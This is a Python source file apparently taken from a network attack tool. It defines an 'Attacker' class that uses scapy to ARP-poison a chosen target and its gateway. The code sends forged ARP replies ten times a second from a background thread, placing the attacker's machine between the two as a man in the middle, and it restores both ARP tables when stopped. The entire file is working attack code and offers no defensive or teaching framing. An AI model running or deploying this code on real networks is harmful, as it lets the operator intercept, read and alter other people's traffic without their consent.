import threading
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

RATE = 10  # poison packets per second


class Attacker:
    def __init__(self, event_bus):
        self.bus = event_bus
        self._thread = None
        self._stop = threading.Event()
        self.active = False
        self.iface = None
        self.target_ip = None
        self.target_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self._own_mac = None

    def start(self, iface, target_ip, target_mac, gateway_ip, gateway_mac):
        if self._thread and self._thread.is_alive():
            self.stop()
        self.iface = iface
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self._own_mac = get_if_hwaddr(iface)
        self.active = True
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.bus.on_attack_started(target_ip, target_mac)

    def stop(self):
        if not self.active:
            return
        self._stop.set()
        self.active = False
        self._restore()
        self.bus.on_attack_stopped(self.target_ip)

    def _loop(self):
        while not self._stop.is_set():
            self._poison()
            time.sleep(1.0 / RATE)

    def _poison(self):
        try:
            # Tell target: "gateway IP is at MY MAC"
            sendp(
                Ether(dst=self.target_mac)
                / ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=self._own_mac),
                iface=self.iface, verbose=False,
            )
            # Tell gateway: "target IP is at MY MAC"
            sendp(
                Ether(dst=self.gateway_mac)
                / ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=self._own_mac),
                iface=self.iface, verbose=False,
            )
        except Exception:
            pass

    def _restore(self):
        """Send correct ARPs to both sides to restore their tables."""
        if not self.target_ip or not self.gateway_mac:
            return
        for _ in range(5):
            try:
                sendp(
                    Ether(dst=self.target_mac)
                    / ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                    iface=self.iface, verbose=False,
                )
                sendp(
                    Ether(dst=self.gateway_mac)
                    / ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=self.target_mac),
                    iface=self.iface, verbose=False,
                )
            except Exception:
                pass
            time.sleep(0.1)
